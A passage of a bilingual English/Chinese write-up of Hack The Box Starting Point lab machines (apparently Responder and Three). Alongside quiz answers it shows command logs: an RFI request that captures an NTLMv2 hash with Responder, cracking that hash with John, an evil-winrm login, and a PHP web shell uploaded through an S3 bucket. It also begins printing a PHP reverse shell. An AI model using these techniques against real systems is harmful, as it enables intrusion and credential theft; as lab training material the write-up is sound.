-<p>6.What is one of the higher-privilege sounding usernames in ‘allowed.userlist’ that we download from the FTP server?</p>
-<p>从 FTP 服务器下载的“allowed.userlist”文件中，有哪些用户名听起来权限较高？</p>
-<p>admin</p>
-<p>7.What version of Apache HTTP Server is running on the target host?</p>
-<p>目标主机上运行的是哪个版本的 Apache HTTP 服务器？</p>
-<p>Apache httpd 2.4.41</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmap -p 80 -sCV 10.129.127.95</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-12 10:58 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> localhost (10.129.127.95)</span><br><span class="line">Host is up (0.24s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-title: Smash - Bootstrap Business Template</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>8.What switch can we use with Gobuster to specify we are looking for specific filetypes?</p>
-<p>我们可以使用 Gobuster 的哪个开关来指定我们要查找的特定文件类型？</p>
-<p>-x</p>
-<p>9.Which PHP file can we identify with directory brute force that will provide the opportunity to authenticate to the web service?</p>
-<p>我们可以通过目录暴力破解找到哪个 PHP 文件，从而获得对 Web 服务的身份验证机会？</p>
-<p>login.php</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> allowed.userlist.passwd</span><br><span class="line">root</span><br><span class="line">Supersecretpassword1</span><br><span class="line">@BaASD&amp;9032123sADS</span><br><span class="line">rKXM59ESxesUFHAd</span><br><span class="line"></span><br><span class="line">admin rKXM59ESxesUFHAd </span><br></pre></td></tr></table></figure>
-<h1 id="Responder"><a href="#Responder" class="headerlink" title="Responder"></a>Responder</h1><p>1.When visiting the web service using the IP address, what is the domain that we are being redirected to?</p>
-<p>使用 IP 地址访问网络服务时，我们会被重定向到哪个域名？</p>
-<p>unika.htb</p>
-<p>2.Which scripting language is being used on the server to generate webpages?</p>
-<p>服务器端使用哪种脚本语言来生成网页？</p>
-<p>php</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmap -p- --min-rate 2000 10.129.95.234</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-12 14:43 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> localhost (10.129.95.234)</span><br><span class="line">Host is up (0.40s latency).</span><br><span class="line">Not shown: 65532 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">80/tcp   open  http</span><br><span class="line">5985/tcp open  wsman</span><br><span class="line">7680/tcp open  pando-pub</span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> nmap -p 80,5985,7680 -sCV 10.129.95.234</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-12 14:46 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> localhost (10.129.95.234)</span><br><span class="line">Host is up (0.33s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE    VERSION</span><br><span class="line">80/tcp   open  http       Apache httpd 2.4.52 ((Win64) OpenSSL/<span class="number">1.1</span>.<span class="number">1</span>m PHP/<span class="number">8.1</span>.<span class="number">1</span>)</span><br><span class="line">|_http-server-header: Apache/<span class="number">2.4</span>.<span class="number">52</span> (Win64) OpenSSL/<span class="number">1.1</span>.<span class="number">1</span>m PHP/<span class="number">8.1</span>.<span class="number">1</span></span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html; charset=UTF-<span class="number">8</span>).</span><br><span class="line"><span class="number">5985</span>/tcp open  http       Microsoft HTTPAPI httpd <span class="number">2.0</span> (SSDP/UPnP)</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/<span class="number">2.0</span></span><br><span class="line"><span class="number">7680</span>/tcp open  pando-pub?</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>3.What is the name of the URL parameter which is used to load different language versions of the webpage?</p>
-<p>用于加载网页不同语言版本的 URL 参数名称是什么？</p>
-<p>page</p>
-<p>4.Which of the following values for the page parameter would be an example of exploiting a Local File Include (LFI) vulnerability: “french.html”, “//10.10.14.6/somefile”, “../../../../../../../../windows/system32/drivers/etc/hosts”, “mimikatz.exe”</p>
-<p>以下哪个 page 参数值会利用本地文件包含 (LFI) 漏洞：“french.html”、“//10.10.14.6/somefile”、“../../../../../../../windows/system32/drivers/etc/hosts”、“mimikatz.exe”../../../../../../../../windows/system32/drivers/etc/hosts</p>
-<p>5.Which of the following values for the page parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: “french.html”, “//10.10.14.6/somefile”, “./../../../../../../../windows/system32/drivers/etc/hosts”, “mimikatz.exe”</p>
-<p>以下哪个 page 参数值会利用远程文件包含 (RFI) 漏洞？”french.html”, “//10.10.14.6/somefile”, “./../../../../../../../windows/system32/drivers/etc/hosts”, “mimikatz.exe”</p>
-<p>//10.10.14.6/somefile</p>
-<p>6.What does NTLM stand for?</p>
-<p>NTLM 代表什么？</p>
-<p>New Technology LAN Manager</p>
-<p>7.Which flag do we use in the Responder utility to specify the network interface?</p>
-<p>在 Responder 工具中，我们应该使用哪个标志来指定网络接口？</p>
-<p>-I</p>
-<p>8.There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as john, but the full name is what?</p>
-<p>有一些工具会接收 NetNTLMv2 质询/响应，并尝试数百万个密码，以查看是否有任何密码会生成相同的响应。其中一款工具通常被称为 john ，但它的全名是什么？</p>
-<p>John The Ripper</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> responder -I tun0</span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> responder -I tun0</span><br><span class="line">[<span class="built_in">sudo</span>] aono 的密码：</span><br><span class="line">                                         __</span><br><span class="line">  .----.-----.-----.-----.-----.-----.--|  |.-----.----.</span><br><span class="line">  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|</span><br><span class="line">  |__| |_____|_____|   __|_____|__|__|_____||_____|__|</span><br><span class="line">                   |__|</span><br><span class="line"></span><br><span class="line">           NBT-NS, LLMNR &amp; MDNS Responder 3.1.5.0</span><br><span class="line"></span><br><span class="line">  To support this project:</span><br><span class="line">  Github -&gt; https://github.com/sponsors/lgandx</span><br><span class="line">  Paypal  -&gt; https://paypal.me/PythonResponder</span><br><span class="line"></span><br><span class="line">  Author: Laurent Gaffie (laurent.gaffie@gmail.com)</span><br><span class="line">  To <span class="built_in">kill</span> this script hit CTRL-C</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Poisoners:</span><br><span class="line">    LLMNR                      [ON]</span><br><span class="line">    NBT-NS                     [ON]</span><br><span class="line">    MDNS                       [ON]</span><br><span class="line">    DNS                        [ON]</span><br><span class="line">    DHCP                       [OFF]</span><br><span class="line"></span><br><span class="line">[+] Servers:</span><br><span class="line">    HTTP server                [ON]</span><br><span class="line">    HTTPS server               [ON]</span><br><span class="line">    WPAD proxy                 [OFF]</span><br><span class="line">    Auth proxy                 [OFF]</span><br><span class="line">    SMB server                 [ON]</span><br><span class="line">    Kerberos server            [ON]</span><br><span class="line">    SQL server                 [ON]</span><br><span class="line">    FTP server                 [ON]</span><br><span class="line">    IMAP server                [ON]</span><br><span class="line">    POP3 server                [ON]</span><br><span class="line">    SMTP server                [ON]</span><br><span class="line">    DNS server                 [ON]</span><br><span class="line">    LDAP server                [ON]</span><br><span class="line">    MQTT server                [ON]</span><br><span class="line">    RDP server                 [ON]</span><br><span class="line">    DCE-RPC server             [ON]</span><br><span class="line">    WinRM server               [ON]</span><br><span class="line">    SNMP server                [OFF]</span><br><span class="line"></span><br><span class="line">[+] HTTP Options:</span><br><span class="line">    Always serving EXE         [OFF]</span><br><span class="line">    Serving EXE                [OFF]</span><br><span class="line">    Serving HTML               [OFF]</span><br><span class="line">    Upstream Proxy             [OFF]</span><br><span class="line"></span><br><span class="line">[+] Poisoning Options:</span><br><span class="line">    Analyze Mode               [OFF]</span><br><span class="line">    Force WPAD auth            [OFF]</span><br><span class="line">    Force Basic Auth           [OFF]</span><br><span class="line">    Force LM downgrade         [OFF]</span><br><span class="line">    Force ESS downgrade        [OFF]</span><br><span class="line"></span><br><span class="line">[+] Generic Options:</span><br><span class="line">    Responder NIC              [tun0]</span><br><span class="line">    Responder IP               [10.10.14.92]</span><br><span class="line">    Responder IPv6             [dead:beef:2::105a]</span><br><span class="line">    Challenge <span class="built_in">set</span>              [random]</span><br><span class="line">    Don<span class="string">&#x27;t Respond To Names     [&#x27;</span>ISATAP<span class="string">&#x27;, &#x27;</span>ISATAP.LOCAL<span class="string">&#x27;]</span></span><br><span class="line"><span class="string">    Don&#x27;</span>t Respond To MDNS TLD  [<span class="string">&#x27;_DOSVC&#x27;</span>]</span><br><span class="line">    TTL <span class="keyword">for</span> poisoned response  [default]</span><br><span class="line"></span><br><span class="line">[+] Current Session Variables:</span><br><span class="line">    Responder Machine Name     [WIN-PXEV9A8X9YY]</span><br><span class="line">    Responder Domain Name      [I4SS.LOCAL]</span><br><span class="line">    Responder DCE-RPC Port     [45005]</span><br><span class="line"></span><br><span class="line">[+] Listening <span class="keyword">for</span> events...</span><br><span class="line"></span><br><span class="line"><span class="comment"># 访问不存在路径时，触发responder劫持</span></span><br><span class="line">http://unika.htb/index.php?page=//10.10.14.92/test</span><br><span class="line"></span><br><span class="line">[SMB] NTLMv2-SSP Client   : 10.129.128.81</span><br><span class="line">[SMB] NTLMv2-SSP Username : RESPONDER\Administrator</span><br><span class="line">[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:b5e984fce819c5e0:1E42B8DE3A84AF3C7366BAE0C0AE2959:0101000000000000006B31185DE2DC010C30076FE984DC360000000002000800490034005300530001001E00570049004E002D005000580045005600390041003800580039005900590004003400570049004E002D00500058004500560039004100380058003900590059002E0049003400530053002E004C004F00430041004C000300140049003400530053002E004C004F00430041004C000500140049003400530053002E004C004F00430041004C0007000800006B31185DE2DC0106000400020000000800300030000000000000000100000000200000358078CEFE6F220D92595E20A810823F019774D5967535C33787DCEC3F65CC920A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00390032000000000000000000</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Administrator::RESPONDER:b5e984fce819c5e0:1E42B8DE3A84AF3C7366BAE0C0AE2959:0101000000000000006B31185DE2DC010C30076FE984DC360000000002000800490034005300530001001E00570049004E002D005000580045005600390041003800580039005900590004003400570049004E002D00500058004500560039004100380058003900590059002E0049003400530053002E004C004F00430041004C000300140049003400530053002E004C004F00430041004C000500140049003400530053002E004C004F00430041004C0007000800006B31185DE2DC0106000400020000000800300030000000000000000100000000200000358078CEFE6F220D92595E20A810823F019774D5967535C33787DCEC3F65CC920A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00390032000000000000000000&quot;</span> &gt; administrator.hash</span><br><span class="line"></span><br><span class="line">john administrator.hash</span><br><span class="line"></span><br><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt administrator.hash</span><br><span class="line"></span><br><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt administrator.hash</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">badminton        (Administrator)</span><br><span class="line">1g 0:00:00:00 DONE (2026-05-12 22:25) 50.00g/s 204800p/s 204800c/s 204800C/s slimshady..oooooo</span><br><span class="line">Use the <span class="string">&quot;--show --format=netntlmv2&quot;</span> options to display all of the cracked passwords reliably</span><br><span class="line">Session completed.</span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> evil-winrm -i 10.129.128.81 -u Administrator -p badminton </span><br></pre></td></tr></table></figure>
-<p>9.What is the password for the administrator user?</p>
-<p>管理员用户的密码是什么？</p>
-<p>badminton</p>
-<p>10.We’ll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?</p>
-<p>我们将使用 Windows 服务（即在目标主机上运行的服务）通过我们找回的密码远程访问响应服务器。它监听的是哪个 TCP 端口？</p>
-<p>5985</p>
-<p>11.On which user’s desktop is the flag located?</p>
-<p>旗帜位于哪个用户的桌面上？</p>
-<p>mike</p>
-<h1 id="Three"><a href="#Three" class="headerlink" title="Three"></a>Three</h1><p>1.How many TCP ports are open?</p>
-<p>有多少个 TCP 端口处于开放状态？</p>
-<p>2</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmap -p- --min-rate 5000 10.129.227.248</span><br><span class="line">[<span class="built_in">sudo</span>] aono 的密码：</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-12 22:34 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.129.227.248</span><br><span class="line">Host is up (0.25s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>2.What is the domain of the email address provided in the “Contact” section of the website?</p>
-<p>网站“联系我们”部分提供的电子邮件地址的域名是什么？</p>
-<p>thetoppers.htb</p>
-<p>3.In the absence of a DNS server, which Linux file can we use to resolve hostnames to IP addresses in order to be able to access the websites that point to those hostnames?</p>
-<p>在没有 DNS 服务器的情况下，我们可以使用哪个 Linux 文件将主机名解析为 IP 地址，以便能够访问指向这些主机名的网站？</p>
-<p>/etc/hosts</p>
-<p>4.Which sub-domain is discovered during further enumeration?</p>
-<p>在进一步枚举过程中发现了哪个子域？</p>
-<p>s3.thetoppers.htb</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">echo</span> <span class="string">&#x27;10.129.227.248 thetoppers.htb&#x27;</span> &gt;&gt; /etc/hosts</span><br><span class="line"></span><br><span class="line">ffuf -u http://thetoppers.htb -H <span class="string">&#x27;Host: FUZZ.thetoppers.htb&#x27;</span> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 11952 -mc all</span><br><span class="line"></span><br><span class="line">        /<span class="string">&#x27;___\  /&#x27;</span>___\           /<span class="string">&#x27;___\</span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/</span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\</span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/</span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\</span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       v2.1.0-dev</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> :: Method           : GET</span></span><br><span class="line"><span class="string"> :: URL              : http://thetoppers.htb</span></span><br><span class="line"><span class="string"> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt</span></span><br><span class="line"><span class="string"> :: Header           : Host: FUZZ.thetoppers.htb</span></span><br><span class="line"><span class="string"> :: Follow redirects : false</span></span><br><span class="line"><span class="string"> :: Calibration      : false</span></span><br><span class="line"><span class="string"> :: Timeout          : 10</span></span><br><span class="line"><span class="string"> :: Threads          : 40</span></span><br><span class="line"><span class="string"> :: Matcher          : Response status: all</span></span><br><span class="line"><span class="string"> :: Filter           : Response size: 11952</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">s3                      [Status: 404, Size: 21, Words: 2, Lines: 1, Duration: 298ms]</span></span><br><span class="line"><span class="string">gc._msdcs               [Status: 400, Size: 306, Words: 26, Lines: 11, Duration: 245ms]</span></span><br></pre></td></tr></table></figure>
-<p>5.Which service is running on the discovered sub-domain?</p>
-<p>已发现的子域上运行着哪项服务？</p>
-<p>Amazon S3</p>
-<p>6.Which command line utility can be used to interact with the service running on the discovered sub-domain?</p>
-<p>可以使用哪个命令行实用程序与在已发现的子域上运行的服务进行交互？</p>
-<p>awscli</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&quot;https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip&quot;</span> -o <span class="string">&quot;awscliv2.zip&quot;</span></span><br><span class="line">unzip awscliv2.zip</span><br><span class="line"><span class="built_in">sudo</span> ./aws/install</span><br></pre></td></tr></table></figure>
-<p>7.Which command is used to set up the AWS CLI installation?</p>
-<p>用于设置 AWS CLI 的命令是什么？</p>
-<p>aws configure</p>
-<p>8.What is the command used by the above utility to list all of the S3 buckets?</p>
-<p>上述工具用来列出所有 S3 存储桶的命令是什么？</p>
-<p>aws s3 ls</p>
-<p>9.语言 php</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">aws configure</span><br><span class="line"></span><br><span class="line">aws s3 <span class="built_in">ls</span> --endpoint http://s3.thetoppers.htb s3://thetoppers.htb</span><br><span class="line"></span><br><span class="line">                           PRE images/</span><br><span class="line">2026-05-13 08:57:03          0 .htaccess</span><br><span class="line">2026-05-13 08:57:03      11952 index.php</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27;</span> &gt; shell.php</span><br><span class="line"></span><br><span class="line">aws s3 <span class="built_in">cp</span> shell.php s3://thetoppers.htb --endpoint-url http://s3.thetoppers.htb</span><br><span class="line"></span><br><span class="line">ip a | grep tun0</span><br><span class="line">77562: tun0: &lt;POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500</span><br><span class="line">    inet 10.10.17.43/23 brd 10.10.17.255 scope global tun0</span><br><span class="line"></span><br><span class="line">curl http://thetoppers.htb/shell.php?cmd=<span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line">images</span><br><span class="line">index.php</span><br><span class="line">shell.php</span><br><span class="line"></span><br><span class="line">curl <span class="string">&#x27;http://thetoppers.htb/shell.php?cmd=cd%20..&#x27;</span></span><br><span class="line">curl <span class="string">&#x27;http://thetoppers.htb/shell.php?cmd=cat%20../flag.txt&#x27;</span></span><br></pre></td></tr></table></figure>
-<p>在这个特定的靶机场景中，S3 存储桶实际上被用作了该网站（thetoppers.htb）的后端存储目录（即 Web 根目录）。</p>
-<ul>
-<li>文件同步/挂载：这台服务器在内部进行了配置，使得托管网站文件的目录（比如 /var/www/html）与名为 thetoppers.htb 的 S3 存储桶进行了绑定或同步。我们在 S3 存储桶里看到的 index.php，正是网站首页运行的代码。</li>
-<li>漏洞产生的核心原因：正是因为这种直接的绑定关系，当攻击者（你）使用 AWS 命令行工具（aws cli）将包含恶意代码的 shell.php 上传到这个 S3 存储桶后，这个文件就直接出现在了网站的目录中。</li>
-<li>实现攻击：当你通过浏览器访问 <a target="_blank" rel="noopener" href="http://thetoppers.htb/shell.php">http://thetoppers.htb/shell.php</a> 时，网站服务器不仅能找到你刚刚上传的文件，而且服务器配置了 PHP 环境，它会解析并执行这个木马脚本，从而导致你的机器获得了目标服务器的控制权（反向 Shell）。</li>
-</ul>
-<p>简而言之，它们的关系是：S3 存储桶 = 网站所在的文件夹。控制了存储桶，就等于获得了随意篡改、添加网站代码的权限。</p>
-<p>扩展：php 反弹shell</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// php-reverse-shell - A Reverse Shell implementation <span class="keyword">in</span> PHP</span><br><span class="line">// Copyright (C) 2007 pentestmonkey@pentestmonkey.net</span><br><span class="line">//</span><br><span class="line">// This tool may be used <span class="keyword">for</span> legal purposes only.  Users take full responsibility</span><br><span class="line">// <span class="keyword">for</span> any actions performed using this tool.  The author accepts no liability</span><br><span class="line">// <span class="keyword">for</span> damage caused by this tool.  If these terms are not acceptable to you, <span class="keyword">then</span></span><br><span class="line">// <span class="keyword">do</span> not use this tool.</span><br><span class="line">//</span><br><span class="line">// In all other respects the GPL version 2 